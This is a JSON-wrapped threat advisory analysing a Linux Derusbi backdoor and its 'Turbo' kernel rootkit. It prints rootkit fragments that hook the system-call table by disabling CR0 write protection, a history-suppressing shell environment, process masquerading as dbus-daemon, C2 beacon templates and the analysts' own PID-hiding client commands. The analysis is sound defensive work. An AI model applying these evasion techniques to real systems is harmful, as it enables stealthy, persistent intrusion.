{
    "id": "ec748a0c-6e30-4c3f-b8e4-d2fac6ab8172",
    "created_at": "2022-10-25T16:48:11.122969Z",
    "updated_at": "2025-03-27T02:16:05.739515Z",
    "deleted_at": null,
    "sha1_hash": "01fda1bcf39d3c6bc88434cca97aff08db32819b",
    "title": "",
    "authors": "",
    "file_creation_date": "2016-03-08T14:05:03Z",
    "file_modification_date": "2016-03-08T14:05:04Z",
    "file_size": 365781,
    "plain_text": "### FIDELIS THREAT ADVISORY #1021\n# The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\nFebruary 29, 2016\n\n## Executive Summary\n\nIn the summer of 2015, Fidelis Cybersecurity had the opportunity to analyze a Derusbi malware sample used as part\nof a campaign we’ve labeled Turbo, for the associated kernel module that was deployed. Derusbi has been widely\ncovered and associated with Chinese threat actors. This malware has been reported to have been used in high profile\nincidents like the ones involving Wellpoint/Anthem, USIS and Mitsubishi Heavy Industries. These incidents have ranged\nfrom simple targeting to reported breaches. Every one of these campaigns involved a Windows version of Derusbi.\n\nWhile we’ve analyzed many common variants of Derusbi, this one got our attention because it’s a Linux variant. A few\nitems make the tools used in this campaign special:\n\nzz This is a 64-bit Linux variant of Derusbi, the only such sample we have observed in our datasets as well as in public\nrepositories. To our knowledge, no analysis of such malware has been made publicly available.\n\nzz We retrieved and analyzed a 64-bit Linux kernel module that was dropped by Derusbi. We’re calling this module\nTurbo.\n\nzz Both the malware and kernel module demonstrate cloaking and anti-analysis techniques. While they mimic\ntechniques observed in Windows tools used by APT in some respects, the use in the Linux environment has forced\nnew and sometimes unique implementations.\n\nzz This Derusbi sample shares command-and-control infrastructure with PlugX samples targeting Windows systems\nseen in public repositories. It is our understanding that these tools were used in conjunction in the campaign.\n\nzz The Derusbi sample has command and control (C2) patterns that precisely match those observed with the Windows\nsamples. This will allow for reuse of command and control platforms for intrusions involving both Windows and\nLinux samples.\n\nzz In this incident, we believe that the binary was recompiled on the same day it was installed with the kernel module\nrebuilt to precisely match the configuration on the target system, potentially indicating the active participation of\ndevelopers with the team conducting the operation. This is distinct from the workflow associated with the more\nmature APT tools, where builders for tools like PlugX, Sakula and Derusbi are assumed to be available to multiple\nactor sets who are likely simply users of these tools.\n\nzz The active participation of developers is further substantiated by the use of the Turbo Linux Kernel Module, which\nwas clearly compiled for the precise Linux version running on the target system.\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\nIt is important to note that it would take significant additional effort to replicate the capabilities of the Windows\nversion into the Linux version. This indicates an investment by the adversary to gain additional footholds within\na victim’s infrastructure. By adding 64-bit Linux servers and clients to their target list it is evident that advanced\nthreat actors continue to add to their capabilities. Enterprises worldwide have been investing in Windows-based\ndetection and remediation platforms for many years now. Linux is widely used in the datacenter and for hosting\ncritical applications and databases. The use of such malware instantly bypasses entire classes of commercial,\nWindows-only products, thus opening up significant new exposures for enterprises.\n\n## Campaign Overview\n\nThe targeted victim is a large public research institution in the United States. All activity reported in this paper was\nobserved in the summer of 2015. The samples discussed in this report are not available in public malware repositories\nand we are not at liberty to share them. We are publishing a comprehensive set of IOCs and a Yara rule to enable\nresearchers and incident responders in the hope that this will help flush out other samples that might be identified in\nintrusions or private malware repositories.\n\nThe incident involved the adversary obtaining ssh access to the target system and then using a standard GNU utility\n(wget) to fetch the malware samples from the IP address 175.45.250.xxx Command and control communications were\nobserved going to a URL that has also been observed in PlugX samples.\n\nThe malware binary downloaded carried a date string in its naming convention that represented the very day that it\nwas downloaded. This is strongly suggestive of the malware having been compiled that day, which can further suggest\nthat a developer was actively associated with the operation. The binary was then renamed to strip this additional\ninformation from the filename.\n\nIn this campaign, the adversary appears to use the second level sub-domain as campaign moniker potentially serving\npurposes such as impersonation (spoofing) and target/campaign identification. This technique also seen used by\nmultiple Chinese actors including the attacks on Anthem, OPM and, most recently, the “Seven Pointed Dagger”\n(Mynamar Election site compromise) as discussed by Arbor Networks.\n\nFurther, the first level domain observed is a Go-Daddy registered domain originally created in February 2015 to\na massive-scale, Chinese-based domain broker registered to the email address, “Bodfeo[@]163[.]com”. Note that\ninfrastructure detailed in recent reports on the use of Derusbi by the C0d0s0 group used the same registration email\nand registrant details.\n\nThe hosts used to serve the malware and provide command and control functions were within the IP range for a\nKorean hosting provider, Netropy.\n\nWe were able to correlate sharing of C2 infrastructure and capabilities between this Linux variant of Derusbi and two\nWindows variants of the PlugX malware.\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\n## Malware Analysis\n\nThe campaign involved the use of the Derusbi sample, which is a user space shared object library and a Linux kernel\nmodule that we’re calling Turbo. We assume that there was a custom loader created to load the shared object library\nand a user space client to drive Turbo. Because we did not have the custom loader and the user space client available\nfor our analysis we recreated each component after understanding the capabilities of the Derusbi and Turbo binaries.\nIt is possible that these functions were combined in the same binary.\n\nloadso\n\n**1** Derusbi Client\n\n(custom loader)\n\n**2** **3**\n\nUser space\n\nKernel space\n\nTurbo\n\n**1. Upon execution, the loader** **2. Derusbi drops Turbo to disk,** **3. The Client uses Turbo to hide**\nloads Derusbi into memory to loads it into the kernel, then relevant user space processes\ngain execution deletes Turbo from disk\n\nThe following characteristics and capabilities were observed for the samples we discuss in this paper.\n\nzz Remote Access Tool\n\n— Directory listing—\n\n— Read files—\n\n— Write files—\n\n— Copy files—\n\n— Rename files—\n\n— Delete files—\n\n— Timestomping—\n\n— Execute commands—\n\n— Remote Bash shell—\n\nzz Anti-Forensics\n\n— Loads a Linux Kernel Module (LKM) and deletes it from the hard disk forcing the LKM to be memory resident —\nonly.\n\n— In addition to deleting the LKM, overwrites the data with null bytes to prevent recovery of original data.—\n\n— Remote Bash shell history is sent to /dev/null—\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\nzz File System\n\n— Writes a Linux LKM to /dev/shm/.x11.id—\n\n— Deletes the LKM shortly after installing it in the system —\n\nzz Networking\n\n— Binds to source ports between the range 31800 to 31900 and beacons to destination port 443—\n\n     - The traffic is not SSL/TLS encrypted\n\n— Observed 64-byte custom protocol beacon during execution—\n\n— Uses a backup communication method with HTTP beacon—\n\n     - Content in the session is obfuscated with a variable 4-byte XOR keys\n\nzz Turbo Kernel Module\n\n— Hides Processes—\n\nA number of anti-forensics techniques must be bypassed in order to determine the true capabilities of this sample.\nSome of these techniques used to hamper forensic analysis include the ability to run as a memory-resident memory\nmodule to prevent file-based detection of the Linux Kernel Module on the localhost and the ability to cleanly remove it\nfrom disk.\n\n#### Analysis of Derusbi\n\nFile: libcrypst.so\n\nThis 64-bit Linux variant of Derusbi shares many of the common capabilities provided by a typical remote access tool,\nincluding directory and file operations, command execution and remote access. Additionally, obfuscation capabilities\nsuch as timestomping and process hiding make this sample even more interesting and difficult to analyze.\n\n###### Static analysis\n\nlibcrypst.so is a malicious 64-bit, dynamically linked, stripped, Linux Shared Object (.so) library which is the Derusbi\nbinary. Despite the symbols being stripped from this binary there were a couple of interesting artifacts. For example,\nthis binary’s actual Linux Shared Name is LxMain64.\n\n**libcrypst.so is the file’s name as recovered from the victim. In the event this file is noticed by a system administrator,**\nthe file uses a common looking filename on disk. In this case, libcrypt.so is a file one would expect to find, whereas\nlibcrypst.so is not. This is an example of the adversary attempting to hide in plain sight.\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\n .data segment\n\nThe .data segment of the LxMain64 (SO) file contains two particularly important blocks of embedded data, the first\nstarting at the file offset: “0x133C0”. The first four bytes of this data block is a 4-byte XOR key used to decode the\nembedded byte array at offset: “0x133CC”. The next eight bytes, starting at file offset: “0x133C4” is actually a 4-byte\nDWORD value repeated twice and used to define the length of the byte array. The byte array starting at file offset:\n“0x133CC” is an obfuscated Linux Kernel Module, which can be decoded using the previously found 4-byte XOR key. In\nthis sample the XOR key is “0x84 0x1B 0x37 0xD6”.\n\nThis segment is significant because the Turbo Linux Kernel Module is present here.\n\nThe “LxMain64” binary also contains a second obfuscated data block within the library. This block is 632 bytes in\nlength and is found starting at file offset: “0x15780”. This data is obfuscated again using another 4-byte XOR key. This\nXOR key is “0x76 0x2D 0xF2 0x41”. When the key is applied, the C2 configuration data is observed in the data block.\n\n###### Export functions\n\nThe following export functions were observed in the “libcrypst.so” malware:\n\nzz iswdigit(wchar_t)\n\nzz .init_proc\n\nzz .term_proc\n\nzz start\n\nDespite the existence of a legitimate API function named iswdigit, the function has been reimplemented within this\nbinary. This is not a ‘trampoline’ technique where malware will jump execution to the standard system iswdigit\nimplementation after being loaded into memory, as it would a Trojan library.\n\n###### Anomalous fini_array section analysis\n\nWhen the shared object is loaded into memory, two segments are called prior to the system reaching this shared\nobjects defined entry point or “start” routine. The very first segment is the usual “.init_proc” segment commonly found\nin a Linux executable, and the second segment is the “.init_array” segment. The .init_array segment contains pointers\nto functions which will be executed when the program starts. In this segment several environmental conditions are\nchecked, a shared memory resource is created, and a new thread is started that begins the Derusbi backdoor activity.\nThe .init_array segment was a reminder of Windows TLS Callback functions, and how they are abused by Windows\nmalware to gain execution before the binary’s configured entry point.\n\nIt is interesting to note that this binary’s “Main Entry” or “start” routine is set to occur within the execution of the “.fini_\narray” segment. This entry point configuration was contrary to what we expected, because the .fini_array segment\ntypically contains pointers to functions that will be executed when the program prepares to exit. Despite the start\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\nroutine’s name and role as the entry point of the binary, its functionality does align with the typical .fini_array function.\nThe start routine’s set functionality is to initiate the malware’s shut-down procedures by continuously waiting for the\ntermination of the thread previously started during the .init_array segment’s execution.\n\n###### Target system verification\n\nBefore beginning execution of any malicious code the malware gathers and checks certain running conditions. If those\nrunning conditions are not met the malware will terminate early. First, it gathers, for later use, the file path from which\nthe shared object will be loaded. Next, it gathers the file path of the process context’s executable module, the loader\nmodule. The binary also collects the current and parent process IDs, but doesn’t do anything with them.\n\nThe first branch to determine early termination is by a check to see if the user’s ID is anything other than zero. On\nLinux systems zero is the root user’s ID, and this Derusbi module will not execute if it does not have root privileges.\nFinally, the last check is to determine if the Shared Object has been loaded into the process space of certain daemon\nprocesses to ensure reliable execution.\n\nThe following is the list of daemon processes that are validated before Derubsi proceeds to execute:\n\nzz /usr/sbin/sshd\n\nzz /sbin/rsyslogd\n\nzz /usr/sbin/rsyslogd\n\nzz /sbin/syslogd\n\nzz /usr/sbin/syslogd\n\nzz /usr/sbin/smbd\n\nzz /usr/sbin/crond\n\nzz /loadso\n\nThe last process, name “loadso”, allows the shared object to be executed no matter what directory as long as the\nparent daemon process name is called “loadso”. We suspect the “loadso” name could either be a leftover artifact name\nof the author’s daemon process during creation and testing, or is an additional binary that the operator may copy to\nthe victim when execution via one of the other listed daemon processes is not possible.\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\n Shared memory segments\n\nAfter the environment conditions are met the malware will create a System V shared memory segment, which is a\nway to attach a segment of physical memory to the virtual address spaces of multiple processes. Derusbi utilizes the\nshared memory segment for forks of itself during operation of a Linux Kernel Module, and remote shell execution.\nDuring our analysis the shared memory segment’s creation had the name of “SYSV82015f0d”, which is a joining of the\ntwo strings “SYSV” and the hexadecimal string representation of the key argument 0x82025f0d passed during the API\ncall, shmget, of the segment’s creation.\n\nThis artifact is especially relevant for security personnel conducting IR analysis on a host.\n\n###### Looking for the GCC compiler\n\nAs shown in the following code segment, the Derusbi variant also gathers information about the victim host. This\ninformation includes the name of the local host, version of GCC (GNU Compiler Collection) and the system information\nabout the machine and operating system.\n\nThe information is transferred back to the command and control infrastructure via network beacons. It is our\nestimation that this is not relevant for execution of the malware but could have been captured in case the kernel\nmodule might have to be recompiled on the victim’s system.\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\n Remote execution behavior\n\nThe malware sample also has the the ability to run an executable or create a remote shell on the victim computer. To\ndo this, it forks off a new process. Once the process is forked, the newly created process configures its environment.\nThe window size is set to 35 rows and 80 columns with a 0x0 pixel frame. It then creates an array of the following\nenvironment variables:\n\nzz “HISTFILE=/dev/null”\n\nzz “PATH=/bin:/sbin:/usr/bin:/usr/sbin”\n\nzz “PS1=RK# \\u@\\h:\\w \\$”\n\nzz “HOME=/”\n\nzz “TERM=vt100”\n\nzz “LS_COLORS=’’”\n\nCritically, this configures the shell to not record command history, a useful anti-forensic technique.\n\nAlso this configuration results in the creation of a very specific Linux shell prompt that looks roughly like\n\nRK# <username>@<hostname>:<working directory>$\n\nThis is very notable because it could represent a quirk on the part of the adversary or a requirement for remote scripts\nthat might be run once command and control is established.\n\nDuring remote execution, if a shell is being created, it makes the following system call:\n\nexecve(“/bin/bash”, “dbus-daemon” “–noprofile” “--norc”, &envp);\n\nOtherwise it executes:\n\nexecve(<executable>, “dbus-daemon”, &envp);\n\nThe use of “dbus-daemon” is an interesting trick used to make detection of a spawned process more difficult. This sets\nargv[0] to “dbus-daemon” rather than the standard name of the executing process. Examining the running processes\nusing the “ps –ef” command, reveals dbus-daemon rather than the actual executable that was created. System\nadministrators would expect the presence of this daemon on the process list and so this becomes another feature\nenabling the malware to hide in plain sight.\n\n##### The Turbo Loadable Kernel Module (LKM)\n\nFile: .x11.id\n\nIn this section, we describe stealth techniques used by Turbo, how it communicates with the userland client and the\ncapabilities it provides.\n\nBased upon the research, it appears that the techniques and source code described in the following blog post were\nused in the creation of this LKM. (http://turbochaos.blogspot.com/2013/10/writing-linux-rootkits-201-23.html)\n\nSince we did not have access to the userland client used in the campaign, we wrote our own, later referenced as\n“x11evilclient”.\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\n Installation and cloaking\n\nThe Derusbi sample decodes and drops the Loadable Kernel Module, Turbo, to the /dev/shm/ directory as ‘.x11.id’ and\ninstalls it using the insmod program. The module is loaded into kernel space in an effort to modify the systems global\ncall table.\n\nProcess\n\nUser space\n\nKernel space\n\nSystem call handler\n\nLoadable Kernel\nModule\n\nReplaces Address\nin System call table\n\nSystem Call Table\n\nwith location of evil\nwrite function\nWrite - (syscall) write()\n\nEvil Write evil_write() functionality\n\n                        - (in LKM) executed then pass to original\n\n**syscall 1: 5.2 Rootkit and OS Architecture — http://r00tkit.me/?p=23**\n\nThe aspect of the systems call table that is modified pertains to process IDs (PIDs). The functionality of this LKM gives\na user space application the ability to hide and/or unhide any process running on the system, which in turn makes\ndetection of the attacker’s malicious applications harder to detect when running on the victim’s system.\n\nAfter the LKM is successfully loaded via insmod and before it has the ability to modify the system call table, the LKM\nneeds to disable the CPUs control register zero’s (CR0) write protection.\n\nOnce CR0’s write protection is disabled, the LKM has the ability to modify the system call table. Directory entries\nassociated with each PID found in the call table can now be referenced. If an attacker chooses to hide a process ID\nfound in the directory entry structure from the system call table, that process ID is not appended to the modified\nsystem call table that the LKM has duplicated and modified. Therefore it will no longer be seen from any command\nthat shows what processes are running on the system.\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\n; 77: v15 = __readcr0();\n\n//Changing control bit to allow write\n\nmov rax, cr0\n\nwrite_cr0 (read_cr0 () & (~ 0x10000));\n\n; 78: v16 = v15;\n\noriginal_ getdents = (void *)sys_call_table[__NR_getdents];\n\nmov ecx, eax\n\nsys_call_table[__NR_getdents] = new_getdents;\n\n; 80: v13 = v17 == 0; write_cr0 (read_cr0 () | 0x10000);\n\nmov rax, rcx\n\n_pseudocode example of hooking the system call table._\n\n; 79: v17 = v15 & 0xFFFEFFFF;\n\nand rax, 0FFFFFFFFFFFEFFFFh\n\n; 81: __writecr0(v17); // #define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))\n\n; 82: // #define GPF_ENABLE write_cr0(read_cr0() | 0x10000)\n\nmov cr0, rax\n\n; 83: qword_2200 = *(int (__fastcall **)(_QWORD, _QWORD, _QWORD))(*(_QWORD *)(readdir_pid + 40) + 48LL);\n\nmov rax, [rdx+28h]\n\nmov rax, [rax+30h]\n\nmov cs:qword_2200, rax\n\n; 84: *(_QWORD *)(*(_QWORD *)(readdir_pid + 40) + 48LL) = disable_protection_cr0;\n\nmov rax, [rdx+28h]\n\nmov qword ptr [rax+30h], offset disable_protection_cr0\n\n; 85: __writecr0(v16);\n\nmov rax, rcx\n\nmov cr0, rax\n\n_ida disassembly from the x11.1d LKM_\n\n###### Communication with the user space client\n\nThe LKM creates a netlink socket so that it can transport data from kernel space to userland. This is noteworthy\nbecause typically such communications would occur using one or more ioctls exposed by the kernel module. It is\npossible this was done to facilitate a looser coupling with the client module and promote code reuse of Turbo for other\nmalware campaigns. The function is called from the kernel module as follows:\n\n\n.text:0000000000000868 ; 64: LODWORD(v11) = _netlink_kernel_create(&init_net, 29LL, _this_module, &unk_F00);\n\n.text:0000000000000868 mov rdx, offset __this_module\n\n.text:000000000000086F mov rcx, offset unk_F00\n\n.text:0000000000000876 mov rdi, offset init_net\n\n.text:000000000000087D call __netlink_kernel_create\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\nThe userland application used by the attackers does not require any special access, such as root, in order to\ncommunicate with the LKM. The send_net_link_message() function is used from user space to send function requests\nto the LKM as illustrated.\n\n\n**_hide_pid(signed int a1);_**\n\n**_unhide_pid(signed int a1);_**\n\n**_is_hidden_pid(signed int a1);_**\n\n**_clear_hidden_pid();_**\n\n\nAnalysis of another rootkit called StealthProc.c shows how the user code might interface with the LKM, using the\nsend_net_link_message() function to send requests, such as hide_pid(255), to hide process ID 255 on the system.\n\n###### Hiding the userland client:\n\nWe’ve named our example client “x11evilclient” to illustrate how an attacker would execute commands via the\ncommand line in order to utilize the x11.id LKM.\n\nEach of the commands issued from the user application “x11evilclient” correlates with a function that the LKM will\nexecute.\n\n\n**Hide PID**\n\n$ ./x11evilclient 1 [pid]\n**Unhide PID**\n\n$ ./x11evilclient 2 [pid]\n**Is PID Hidden?**\n\n$ ./x11evilclient 3 [pid]\n**Clear hidden PIDs**\n\n$ ./x11evilclient 4\n\n\nFor the client to communicate with the x11.1d LKM, a module_code number is called from the user space application.\nIt has to match the number used in the create netlink_kernel_create function on the kernel side. If an attacker\nchooses to call the hidepid function with the argument for the PID to hide, the directory entry associated with the\ncalled PID in the system table is added to a list of hidden PIDs. The directory entry structure is rebuilt for each normal\nprocess ID and included in the new copied version of the system call table. The hidden PID called from userland is not\nincluded in the system call table.\n\n**Unhidepid will reference the list of saved hidden PIDs and restore the associated directory entry for the processes the**\nattacker would like to unhide.\n\nUpon removal, Turbo will restore the original system call table.\n\nTurbo’s purpose is clearly to help cover the tracks and activities of this threat group. Utilizing a kernel module that\nhooks the system call table in order to modify the visibility of PIDs from user space is an advanced technique in our\nestimation.\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\n##### Networking/Command and Control\n\nWhen making command and control interactions, this malware binds to a raw socket on a random source port\nbetween 31800 and 31900, and beacons to the preconfigured destination port from the earlier mentioned C2\nconfiguration block. Although this particular sample was configured to beacon to the HTTPS destination port 443, the\ndata transmitted is not SSL/TLS encrypted. Additionally, this malware uses a backup communication method of an\nHTTP beacon with the content in the session obfuscated with variable 4-byte XOR keys.\n\nThe following POST request was observed:\n\nPOST /photos/photo.asp HTTP/1.1\nHOST:[C2 Domain Removed]:443\nUser-Agent: Mozilla/4.0\nProxy-Connection: Keep-Alive\nConnection: Keep-Alive\nPragma: no-cache\n\nThen, the command and control server responded with the following:\n\nHTTP/1.0 200\nServer: Apache/2.2.3 (Red Hat)\nAccept-Ranges: bytes\nContent-Type: text/html\nProxy-Connection: keep-alive\n\nAfter receiving this response, the victim system’s next beacon contained the following data:\n\n```\nOffset   0 1 2 3 4 5 6 7  8 9 A B C D E F\n00000000  B6 00 00 00 01 00 00 00 60 29 00 00 F7 C8 2D 3E  ¶    `) ÷È->\n00000010  01 00 00 00 3C 01 00 00 FF 05 E1 32 B7 00 00 00    <  ÿ á2·\n00000020  9B FA 00 3E D7 D0 2D 3E F4 AA 00 00 00 00 00 00  ›ú >×Ð->ôªDQƒ¥ \n00000030  EF 30 2D 34 F7 20 20 20 D9 20 03 20 20 E6 20 20  ï0-4÷  Ù  æ \n00000040  20 20 39 3F F1 CA 2D 3E F7 84 44 50 82 B0 04 BE   9?ñÊ->÷„DP‚° ¾\n00000050  F7 E6 F1 3F F7 DC 1E 10 C6 FB 03 0E DA FD 18 13  ÷æñ?÷Ü Æû Úý\n\n```\n00000060  90 AD 43 5B 85 C8 0E 07 C3 E5 78 5C 82 A6 59 4B  �-C[…È Ãåx\\‚¦YK\n```\n00000070  D7 9B 60 6E D7 C8 55 06 C1 97 1B 0A DF C8 2C A2  ×›`n×ÈU Á— ßÈ,¢\n00000080  FE CE 0D 48 92 BA 5E 57 98 A6 0D 13 03 C8 2D 2F  þÎ H’º^W˜¦  È-/\n00000090  9E AB 0D 16 95 BD 44 52 93 AC 6D 5C 85 A7 5A 50  ž« •½DR“¬m\\…§ZP\n000000A0  9E AD 04 1E F7 AF 4E 5D D7 BE 48 4C 84 A1 42 50  ž- ÷¯N]×¾HL„¡BP\n000000B0  D7 FC 2D 2F F7 C8                 ×ü-/÷È\n\n```\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\nThe above data can be decoded with the highlighted XOR key (0xF7 C8 2D 3E). When the key is applied, the following\ndecoded data is displayed:\n\n```\nOffset   0 1 2 3 4 5 6 7  8 9 A B C D E F\n00000000  41 C8 2D 3E F6 C8 2D 3E 97 E1 2D 3E 00 00 00 00  AÈ->öÈ->—á->  \n00000010  F6 C8 2D 3E CB C9 2D 3E 08 CD CC 0C 40 00 00 00 öÈ->ËÉ-> ÍÌ @ \n00000020  6C 32 2D 00 20 18 00 00 03 62 00 00 00 00 00 00  l2-   \n00000030  18 F8 00 0A 00 20 20 20 2E 20 2E 20 20 2E 20 20  ø   . . .\n00000040  20 20 14 01 06 02 00 00 00 4C 69 6E 75 78 29 80      Linux)€\n00000050  00 2E DC 01 00 14 33 2E 31 33 2E 30 2D 35 35 2D  .Ü  3.13.0-5500000060  67 65 6E 65 72 00 23 39 34 2D 55 62 75 6E 74 75  gener #94-Ubuntu\n00000070  20 53 4D 50 20 00 78 38 36 5F 36 34 28 00 01 9C  SMP x86_64( œ\n00000080  09 06 20 76 65 72 73 69 6F 6E 20 2D F4 00 00 11   version -ô \n00000090  69 63 20 28 62 75 69 6C 64 64 40 62 72 6F 77 6E  ic (buildd@brown\n000000A0  69 65 29 20 00 67 63 63 20 76 65 72 73 69 6F 6E  ie) gcc version\n000000B0  20 34 00 11 00 00                  4  \n\n```\n\nThe above data contains victim system information. Attribution data has been obscured by the analyst.\n\nAfter the victim system beaconed with the above data, the C2 responded with the following:\n\n```\nOffset   0 1 2 3 4 5 6 7  8 9 A B C D E F\n00000000  2D 00 00 00 02 00 00 00 42 00 00 00 42 04 E6 2A  -    B  B æ*\n00000010  01 00 00 00 18 00 00 00 40 04 E6 2A 42 04 CF 2A      @ æ*B Ï*\n00000020  42 01 E7 2A 42 04 E6 2A 42 04 F7 2A 42      B ç*B æ*B ÷*B\n\n```\n\nThe second beacon from the victim system also contained XOR encoded data using the following key: 0x3A D1 7B DC.\nWhen the data was decoded, the C2 domain and port were revealed and also what appeared to be the campaign code.\nLike with the previous case, the XOR key was contained between bytes 13-16 of the beacon.\n\nAdditionally, the following HTTP headers were extracted from the sample. Note that these are perfectly in sync\n**with observations made with over 25 samples representing multiple Windows variants of Derusbi that have**\n**been observed since 2011. We achieved this validation using a custom Yara rule. The hashes for these files and**\n**the Yara rule are present in our github repository. The use of a common beacon protocol is highly suggestive of**\n**infrastructure reuse on the command and control server. While the component installed on the victim machine is a**\n**new implementation, purpose built for Linux, the server infrastructure can be reused.**\n\nPOST /photos/photo.asp HTTP/1.1\nHOST: %s:%d\nUser-Agent: Mozilla/4.0\nProxy-Connection: Keep-Alive\nConnection: Keep-Alive\nPragma: no-cache\n\nCONNECT %s:%d HTTP/1.1\nHOST: %s:%d\nContent-Length: 0\nUser-Agent: Mozilla/4.0\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\nCONNECT %s:%d HTTP/1.1\nHOST: %s:%d\nContent-Length: 0\nUser-Agent: Mozilla/4.0\nProxy-Connection: Keep-Alive\nPragma: no-cache\nProxy-Authorization: Basic %s\n\nHTTP/1.1 200 OK\nServer: Apache 1.3.19\nCache-Control: no-cache\nPragma: no-cache\nExpires: 0\nConnection: Keep-Alive\nContent-Type: application/octet-stream\nContent-Length: 0\n\nPOST /Catelog/login1.asp HTTP/1.1\nHost: %s:%d\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\nContent-Type: application/x-octet-stream\nContent-Length: %d\n\nHTTP/1.1 200 OK\nServer: Apache 1.3.19\nCache-Control: no-cache\nPragma: no-cache\nExpires: 0\nConnection: Keep-Alive\nContent-Type: application/x-octet-stream\nContent-Length: %d\n\nGET /Query.asp?loginid=112037 HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nHost: %s:%d\nCache-Control: no-cache\nPragma: no-cache\nConnection: Keep-Alive\n\nIn addition to the HTTP C2 beacons, during execution of the shared object, a non-HTTP custom beacon was observed.\nThe beacon content is 64 bytes in length and random during every occurrence.\n\n\n-----\n\n###### The Turbo Campaign, Featuring Derusbi for 64-bit Linux\n\n## The Fidelis Take\n\nOur research has uncovered similarities of this Derusbi 64-bit Linux variant with multiple version of Derusbi for\nthe Windows operating system, potentially making a closer correlation between the actors behind this high-profile\nmalware. The shared infrastructure and capabilities between this Linux variant of Derusbi and Windows variants\nhighlight this continued evolution. The use of Derusbi and the Turbo Linux kernel module in this campaign reveal\nconsiderable sophistication.\n\nThreat actors continue to expand their capabilities by updating and modifying the tools they use. This investment\nallows them to maintain/increase access and cover a larger portion of the victim’s infrastructure, in this case into the\nLinux 64-bit environment. This research also shows how these threat actors implement advanced techniques, but also\nhow artifacts from the network intrusion can still be detected by network defenders and incident responders.\n\nFidelis Cybersecurity’s products detect the activity documented in this paper and additional technical indicators are\n[published in the appendices of this paper and to the Fidelis Cybersecurity github at https://github.com/fideliscyber.](https://github.com/fideliscyber)\n\n## References\n\n1 [Newcomers in the Derusbi family, Dec 2015: http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-](http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family)\n[the-Derusbi-family](http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family)\n\n2 [Exploring Bergard: Old Malware with New Tricks: http://www.proofpoint.com/us/exploring-bergard-old-malware-](http://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks)\n[new-tricks](http://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks)\n\n3 [I am HDRoot! Part 2, Oct 2015: https://securelist.com/analysis/publications/72356/i-am-hdroot-part-2/](https://securelist.com/analysis/publications/72356/i-am-hdroot-part-2/)\n\n4 [Derusbi (Server Variant) Analysis, Nov 2014: https://www.novetta.com/wp-content/uploads/2014/11/Derusbi.pdf](https://www.novetta.com/wp-content/uploads/2014/11/Derusbi.pdf)\n\n5 [Catching the silent whisper: understanding the Derusbi family tree, Oct 2015: https://www.virusbtn.com/pdf/](https://www.virusbtn.com/pdf/conference_slides/2015/Pun-etal-VB2015.pdf)\n[conference_slides/2015/Pun-etal-VB2015.pdf](https://www.virusbtn.com/pdf/conference_slides/2015/Pun-etal-VB2015.pdf)\n\n6 [Shell_Crew, Jan 2014: https://www.emc.com/collateral/white-papers/h12756-wp-shell-crew.pdf](https://www.emc.com/collateral/white-papers/h12756-wp-shell-crew.pdf)\n\n7 [ThreatConnect Research Team. (2015, June 5). OPM Breach Analysis: https://www.threatconnect.com/opm-](https://www.threatconnect.com/opm-breach-analysis/)\n[breach-analysis/](https://www.threatconnect.com/opm-breach-analysis/)\n\n8 [ThreatConnect Research Team. (2015, Feburary 27). The Anthem Hack: All Roads Lead to China: https://www.](https://www.threatconnect.com/the-anthem-hack-all-roads-lead-to-china/)\n[threatconnect.com/the-anthem-hack-all-roads-lead-to-china/](https://www.threatconnect.com/the-anthem-hack-all-roads-lead-to-china/)\n\n9 [ASERT Threat Intelligence Report — Uncovering the Seven Pointed Dagger. (2016, January 11): http://www.](http://www.arbornetworks.com/blog/asert/uncovering-the-seven-pointed-dagger/)\n[arbornetworks.com/blog/asert/uncovering-the-seven-pointed-dagger/](http://www.arbornetworks.com/blog/asert/uncovering-the-seven-pointed-dagger/)\n\n[10 Barnett, E. (2012, September 2). The growing threat of domain squatters: http://www.telegraph.co.uk/finance/](http://www.telegraph.co.uk/finance/newsbysector/mediatechnologyandtelecoms/digital-media/9514037/The-growing-threat-of-domain-squatters.html)\n[newsbysector/mediatechnologyandtelecoms/digital-media/9514037/The-growing-threat-of-domain-squatters.](http://www.telegraph.co.uk/finance/newsbysector/mediatechnologyandtelecoms/digital-media/9514037/The-growing-threat-of-domain-squatters.html)\n[html](http://www.telegraph.co.uk/finance/newsbysector/mediatechnologyandtelecoms/digital-media/9514037/The-growing-threat-of-domain-squatters.html)\n\nUsers are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use. This document\ncannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written approval of Fidelis\nCybersecurity, Inc. While we have done our best to ensure that the material found in this document is accurate, Fidelis Cybersecurity, Inc. makes no\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
